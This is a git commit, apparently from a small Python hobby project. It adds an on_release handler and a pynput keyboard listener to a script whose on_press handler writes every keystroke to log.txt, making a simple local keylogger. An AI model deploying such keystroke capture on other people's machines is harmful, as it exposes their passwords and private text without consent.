8c9b966211a3f4d083897e6dc9107e9c021ae0ea
bilel233 <bilel.mjdb@gmail.com>
2024-07-30 12:57:36 +0100

    fonction on_release

--- main.py
+++ main.py
@@ -10,3 +10,11 @@ def on_press(key):
         with open("log.txt","a") as f:
             f.write(f"{key}")
 
+def on_release(key):
+    """enregistre la touche relachee"""
+
+    if key == keyboard.Key.esc:
+        return False
+
+with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
+    listener.join()
